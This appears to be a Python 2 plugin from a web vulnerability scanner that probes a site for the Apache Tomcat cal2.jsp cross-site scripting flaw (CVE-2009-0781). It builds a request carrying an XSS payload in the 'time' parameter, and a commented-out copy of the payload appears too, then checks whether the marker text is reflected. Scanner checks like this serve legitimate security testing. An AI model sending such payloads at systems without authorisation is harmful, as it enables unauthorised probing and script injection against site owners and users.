#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_domain(http, ob):
    '''
    CVE-ID：CVE-2009-0781
    CNNVD-ID：CNNVD-200903-175
    Apache Tomcat'jsp/cal/cal2.jsp'跨站脚本攻击漏洞(CVE-2009-0781)
    CVSS分值:	4.3	[中等(MEDIUM)]
    CWE-79	[在Web页面生成时对输入的转义处理不恰当（跨站脚本）]
    '''
    server = ob.get('webServer')
    if server in ['nginx', 'iis']:
        return []
    result = []
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        result = []
        header = {

            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache",
            "Cookie": ob.get('cookie') if ob.get('cookie') else '',
            "Host": domain,
            # "Connection": "keep-alive"
        }
        # inj_value = "8am%20STYLE=xss:e/**/xpression(try{a=firstTime}catch(e){firstTime=1;alert(%27Apache Tomcat XSS%27)});"
        # path = 'examples/jsp/cal/cal2.jsp'
        # new_url = "%s://%s/%s?time=%s" % (scheme, domain, path, inj_value)
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        new_url = scheme+"://"+domain+"/examples/jsp/cal/cal2.jsp?time=8am%20STYLE=xss:e/**/xpression(try{a=firstTime}" \
              "catch(e){firstTime=1;alert(%27Apache%20Tomcat%20XSS%27)});"
        res, content = http.request(new_url, 'GET', headers=header)
        if res.get('status') == '200' and re.search(r"Apache Tomcat XSS", content, re.I):

            response = getResponse(res, content, keywords="Apache Tomcat XSS", save_con_num=50)
            request = getRequest(new_url, headers=header, domain=ob['domain'])
            detail = "存在Apache Tomcat'jsp/cal/cal2.jsp'跨站脚本攻击漏洞(CVE-2009-0781)"
            result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
        return result
    except Exception, e:
        logger.error("File:Apache_Tomcat_cal2_XssScript_yd.py, run_domain function :%s" % (str(e)))
        return result
